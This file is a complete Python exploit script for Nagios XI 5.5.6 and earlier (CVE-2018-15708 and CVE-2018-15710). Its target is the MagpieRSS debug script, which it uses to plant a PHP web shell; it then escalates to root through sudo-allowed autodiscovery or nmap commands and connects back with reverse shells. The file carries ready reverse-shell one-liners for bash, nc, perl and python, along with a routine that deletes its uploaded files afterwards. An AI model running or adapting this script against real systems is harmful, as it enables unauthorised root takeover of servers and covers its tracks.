#!/usr/bin/env python3

# Exploit Title: Nagios XI 5.5.6 Remote Code Execution and Privilege Escalation
# Date: 2020-08-14
# Exploit Author: vrvik
# Vendor Homepage: https://www.nagios.com/
# Product: Nagios XI
# Software Link: https://assets.nagios.com/downloads/nagiosxi/5/xi-5.5.6.tar.gz
# Version: From 2012r1.0 to 5.5.6
# Tested on: 
#   - CentOS Linux 7.5.1804 (Core) / Kernel 3.10.0
#   - Nagios XI 2012r1.0, 5r1.0, and 5.5.6
# CVE: CVE-2018-15708, CVE-2018-15710
#
# See Also:
# https://www.tenable.com/security/research/tra-2018-37
# https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172
#
# This code exploits both CVE-2018-15708 and CVE-2018-15710 to pop a root reverse shell.
import requests
import re
import sys
import os
import subprocess
import threading
import argparse
import random
import string
import urllib.parse
import time
import socketserver
from http.server import HTTPServer, BaseHTTPRequestHandler
from OpenSSL import crypto
import ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

banner = """
'##::: ##::::'###:::::'######:::'####::'#######:::'######:::::'##::::'##:'####:
 ###:: ##:::'## ##:::'##... ##::. ##::'##.... ##:'##... ##::::. ##::'##::. ##::
 ####: ##::'##:. ##:: ##:::..:::: ##:: ##:::: ##: ##:::..::::::. ##'##:::: ##::
 ## ## ##:'##:::. ##: ##::'####:: ##:: ##:::: ##:. ######:::::::. ###::::: ##::
 ##. ####: #########: ##::: ##::: ##:: ##:::: ##::..... ##:::::: ## ##:::: ##::
 ##:. ###: ##.... ##: ##::: ##::: ##:: ##:::: ##:'##::: ##::::: ##:. ##::: ##::
 ##::. ##: ##:::: ##:. ######:::'####:. #######::. ######::::: ##:::. ##:'####:
..::::..::..:::::..:::......::::....:::.......::::......::::::..:::::..::....::
'########:'##::::'##:'########::'##::::::::'#######::'####:'########:
 ##.....::. ##::'##:: ##.... ##: ##:::::::'##.... ##:. ##::... ##..::
 ##::::::::. ##'##::: ##:::: ##: ##::::::: ##:::: ##:: ##::::: ##::::
 ######:::::. ###:::: ########:: ##::::::: ##:::: ##:: ##::::: ##::::
 ##...:::::: ## ##::: ##.....::: ##::::::: ##:::: ##:: ##::::: ##::::
 ##:::::::: ##:. ##:: ##:::::::: ##::::::: ##:::: ##:: ##::::: ##::::
 ########: ##:::. ##: ##:::::::: ########:. #######::'####:::: ##::::
........::..:::::..::..:::::::::........:::.......:::....:::::..:::::

+-+-+ +-+-+-+-+-+
|B|y| |v|r|v|i|k|
+-+-+ +-+-+-+-+-+
"""

def http_get(url):
    try:
        req = requests.get(url, timeout=50, verify=False)
    except requests.exceptions.ReadTimeout:
        print(f'\n\nError: Request to {url} timed out.\n\n')
        exit()
    else:
        return req

def url_ok(url):
    req = http_get(url)
    return (req.status_code == 200)

def get_random_string(length):
    # Random string with the combination of lower and upper case
    letters = string.ascii_letters
    random_str = ''.join(random.choice(letters) for i in range(length))
    return random_str

def exploit(url):
    time.sleep(5)
    requests.get(url, verify=False)


def cleanUp(url, cleanup_paths):
    time.sleep(15)
    # clear local generated ssl keys
    paths = ['/tmp/key.key', '/tmp/cert.crt']
    for path in paths:
            os.remove(path)
    # clear remote uploaded files
    for path in cleanup_paths:
        del_command = f'rm {path}'
        querystr = { 'cmd' : del_command }
        remove_url = url + '?' + urllib.parse.urlencode(querystr)
        http_get(remove_url)

def serverShutdown(server):
    time.sleep(30)
    server.stop()


def shell_generator(shell_type, lhost, lport):
    available_shells = {
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {lhost} {lport} > /tmp/f",
        'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        'perl': "perl -e 'use Socket;$i=\"" + lhost + "\";$p=" + lport + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'",
        'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'",
    }

    return available_shells[shell_type]

def cert_gen(key_file, cert_file):
    # Unlink Keys if already present
    if os.path.exists(key_file):
        os.unlink(key_file)
    if os.path.exists(cert_file):
        os.unlink(cert_file)

    # create a key pair
    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 4096)
    # create a self-signed cert
    certificate = crypto.X509()
    certificate.get_subject().C = 'rv'
    certificate.get_subject().ST = 'vrvik'
    certificate.get_subject().L = 'vrvik'
    certificate.get_subject().O = 'vrvik'
    certificate.get_subject().OU = 'vrvik'
    certificate.get_subject().CN = 'vrvik'
    certificate.get_subject().emailAddress = 'vrvik@pwn.com'
    certificate.set_serial_number(1000)
    certificate.gmtime_adj_notBefore(0)
    certificate.gmtime_adj_notAfter(10*365*24*60*60)
    certificate.set_issuer(certificate.get_subject())
    certificate.set_pubkey(key)
    certificate.sign(key, 'sha512')
    with open(cert_file, "wt") as f:
        f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, certificate).decode("utf-8"))
    with open(key_file, "wt") as f:
        f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key).decode("utf-8"))

class myHttpd(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        msg = "<?php if( isset( $_REQUEST['cmd'] ) ) { system( $_REQUEST['cmd'] . ' 2>&1' ); }"
        self.wfile.write(str.encode(msg))

class webServer(object):
    def __init__(self, whost, wport, keyfile, certfile):
        self.whost = whost
        self.wport = int(wport)
        self.server = socketserver.TCPServer((self.whost, self.wport), myHttpd)
        self.server.socket = ssl.wrap_socket (self.server.socket, keyfile=keyfile, certfile=certfile, server_side=True)
        
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True
    
    def start(self):
        print(f'Successfully started a Web Server, It is listening on {self.whost}:{self.wport}')
        self.server_thread.start()
    
    def stop(self):
        self.server.shutdown()
        self.server.server_close()

if __name__=='__main__':
    description = 'Nagios XI 5.5.6 MagpieRSS Remote Code Execution and Privilege Escalation'
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('-t', type=str, required=True, help='Target URL, example: https://10.10.10.10', dest='target')
    parser.add_argument('-lh', type=str, required=True, help='localhost IP to listen on to catch a reverse connection', dest='lhost')
    parser.add_argument('-lp', type=str, default=6666, help='Defaulted to 6666 -> localhost Port to listen on to catch a reverse connection', dest='lport')
    parser.add_argument('-wh', type=str, required=True, help='IP on which webserver needs to be started', dest='whost')
    parser.add_argument('-wp', type=str, default=7777, help='Defaulted to 7777 -> port on which webserver needs to be started', dest='wport')
    parser.add_argument('-shell', type=str, default='root', help='Defaulted to root -> (low) for Low privilege Shell or (root) Root Shell', dest='shell')
    parser.add_argument('-st', type=str, default='nc', help='Defaulted to nc -> Shell Type, Available Shell Types are python, python3, perl, bash & nc', dest='shell_type')
    args = parser.parse_args()
    print(banner)
    if args.target is None or args.lhost is None or args.whost is None:
        parser.print_help()
        exit()
    if args.shell != 'root' and args.shell != 'low':
        print('\n\nInvalid Shell argument given, Please refer to the help section\n\n')
        exit()
    if bool(re.search('[hH][tT][tT][pP][sS]\:\/\/', args.target)) == False:
        print('\n\nThere is something wrong with the URL, it needs to have https://\n\n')
        exit()
    
    if url_ok(args.target):
        key_file = '/tmp/key.key'
        cert_file = '/tmp/cert.crt'
        
        cert_gen(key_file, cert_file)
        
        server = webServer(args.whost, args.wport, key_file, cert_file)
        server.start()

        magpie_url = args.target + '/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php'
        if url_ok(magpie_url):
            print('\nFound magpie_debug.php.\n')
            
            global random_str_for_file_upload
            random_str_for_file_upload = get_random_string(8) + '.php'
            exec_path = None
            cleanup_paths = []
            paths = [
                ( '/usr/local/nagvis/share/', '/nagvis' ),
                ( '/var/www/html/nagiosql/', '/nagiosql' )
            ]
            for path in paths:
                upload_path = path[0] + random_str_for_file_upload
                payload_url = f'https://{args.whost}:{args.wport}/%20-o%20{upload_path}'
                url = f'{magpie_url}?url={payload_url}'
                http_get(url)
                payload_check_url = f'{args.target}{path[1]}/{random_str_for_file_upload}'
                if url_ok(payload_check_url):
                    exec_path = payload_check_url
                    cleanup_paths.append(upload_path)
                    break
                
            if exec_path is not None:
                print(f'\nPHP payload successfully uploaded to: {exec_path}\n')
                print('\nEnumerating some basic Info....')
                commands = [
                    ('whoami', 'Current User'),
                    ("cat /usr/local/nagiosxi/var/xiversion | grep full | cut -d '=' -f 2", 'Nagios XI Version')
                ]
                for cmd in commands:
                    querystring = {'cmd' : cmd[0]}
                    url = f'{exec_path}?{urllib.parse.urlencode(querystring)}'
                    req = http_get(url)
                    sys.stdout.write('\t' + cmd[1] + ' => ' + req.text)
                rev_shell = shell_generator(args.shell_type, args.lhost, args.lport)
                if args.shell == 'root':
                    querystring = {'cmd' : 'sudo -l | grep NOPASSWD'}
                    url = f'{exec_path}?{urllib.parse.urlencode(querystring)}'
                    req = http_get(url);
                    if req.status_code == 200:
                        if re.search('.*autodiscover_new.php*', req.content.decode('utf-8')):
                            print('\nPrivilege escalation vector found in autodiscover_new.php')
                            priv_esc_command = f"sudo php /usr/local/nagiosxi/html/includes/components/autodiscovery/scripts/autodiscover_new.php --addresses='127.0.0.1/1`{rev_shell}`'"
                            cleanup_path = None
                        elif re.search('.*nmap*', req.content.decode('utf-8')):
                            print('\nPrivilege escalation vector found in nmap')
                            priv_esc_command = f"echo 'os.execute(\"{rev_shell}\")' > /var/tmp/shell.nse && sudo nmap --script /var/tmp/shell.nse"
                            cleanup_path = "/var/tmp/shell.nse"
                        else:
                            print('\nNo Privilege Escalation vector found on this machine')
                            exit()
                    else:
                        print('\nNo Privilege Escalation vector found on this machine')
                        exit()
                    
                    timed_out = False
                    try:
                        querystring = {'cmd' : priv_esc_command}
                        priv_esc_url = f'{exec_path}?{urllib.parse.urlencode(querystring)}'
                        req = requests.get(priv_esc_url, timeout=5, verify=False)
                        print(f'\nTrying to escalate privileges with url: {priv_esc_url}')
                        print(f'\n\nIf {args.shell_type} payload does not work, please consider using another payload from the available list.\n')
                    except requests.exceptions.ReadTimeout:
                        timed_out = True
                        if cleanup_path is not None:
                            cleanup_paths.append(cleanup_path)
                    if timed_out:
                        print(f'\nStarting a listener on port {args.lport}, Please wait... this might take a few seconds.\nCleanup of all the locally created and remotely created files created in this process will be done in the background\n')
                        t2 = threading.Thread(target=exploit, args=(priv_esc_url,))
                        t2.daemon = True
                        t2.start()
                        t3 = threading.Thread(target=cleanUp, args=(exec_path, cleanup_paths))
                        t3.daemon = True
                        t3.start()
                        t4 = threading.Thread(target=serverShutdown, args=(server,))
                        t4.daemon = True
                        t4.start()
                        try:
                            subprocess.run('nc -nlvp ' + args.lport, shell=True)
                        except Exception as e:
                            print(f'\nException Occured: {e}\n')
                    else:
                        print('Something went wrong\n')
                elif args.shell == 'low':
                    print('checkpoint 1')
                    querystring = {'cmd' : rev_shell}
                    rev_shell_url = f'{exec_path}?{urllib.parse.urlencode(querystring)}'
                    req = requests.get(rev_shell_url, verify=False)
                    print(f'\nTrying to get a reverse shell with this url: {rev_shell_url}')
                    print(f'\n\nIf {args.shell_type} payload does not work, please consider using another payload from the available list.\n')
                    print(f'\nStarting a listener on port {args.lport}, Please wait... this might take a few seconds.\nCleanup of all temporary files created in this process will be done in the background\n')
                    t2 = threading.Thread(target=exploit, args=(rev_shell_url,))
                    t2.daemon = True
                    t2.start()
                    t3 = threading.Thread(target=cleanUp, args=(exec_path, cleanup_paths))
                    t3.daemon = True
                    t3.start()
                    t4 = threading.Thread(target=serverShutdown, args=(server,))
                    t4.daemon = True
                    t4.start()
                    try:
                        subprocess.run('nc -nlvp ' + args.lport, shell=True)
                    except Exception as e:
                        print(f'\nException Occured: {e}\n')
                else:
                    print('\n\nInvalid Shell argument given, Please refer to the help section\n\n')
                    exit()
            else:
                print('\n\nError: Uploading of PHP payload failed!!!\n\n')
                exit()
        else:
            print(f'\n\nError: Magpie URL->{magpie_url} not found.\n\n')
            exit()
    else:
        print(f'\n\nError: Request to {args.target} failed.\n\n')
        exit()
